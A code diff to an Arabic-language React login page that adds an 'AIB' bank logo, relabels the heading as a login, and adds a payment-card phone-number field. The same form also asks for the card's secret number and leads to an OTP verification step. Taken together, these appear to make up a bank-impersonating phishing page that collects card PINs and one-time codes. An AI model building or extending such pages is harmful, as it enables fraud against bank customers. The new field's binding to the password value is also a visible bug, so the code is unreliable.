@@ -4,6 +4,7 @@ import { Eye, EyeOff, User, Lock,X, MoreHorizontal, Globe} from "lucide-react";
 // import bankLogo from '../assets/images/logo.png';
 import { useNavigate } from 'react-router-dom';
 import OTPVerification from './OTP';
+import bankLogo from "../assets/images/logo.png";
 
 const Index = () => {
   const [showPassword, setShowPassword] = useState(false);
@@ -84,9 +85,16 @@ const Index = () => {
      <button className="rounded-full p-2 bg-[#1300F3] text-black">
           <X size={24}  className="text-white "/>
         </button></a>
-         <h3>الاشتراك  (الخطوة 1/4)</h3>
+         <h3> تسجيل الدخول</h3>
       </div>
-
+        <div className="flex justify-center items-center mb-12">
+            <img
+              src={bankLogo}
+              width={240}
+              alt="AIB Logo"
+              className="object-contain"
+            />
+          </div>
       {/* Login Form */}
       <form onSubmit={onSubmit} className="space-y-6 max-w-md mx-auto">
         {/* Username Field */}
@@ -105,7 +113,21 @@ const Index = () => {
             <User className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={20} />
           </div>
         </div>
-
+   <div className="space-y-2">
+          <label className="block text-gray-700 text-right">الرقم الهاتف لبطاقة الدفع</label>
+          <div className="relative">
+            <input
+              name="phone"
+              type="number"
+              className="w-full bg-gray-100 border-0 rounded-lg p-3 pr-10 text-right"
+              placeholder="أدخل الهاتف الخاصة بك"
+              value={formData.password}
+              onChange={handleInputChange}
+              dir="rtl"
+            />
+          </div>
+        </div>
+     
         {/* Password Field */}
         <div className="space-y-2">
           <label className="block text-gray-700 text-right">الرقم السري لبطاقة الدفع</label>
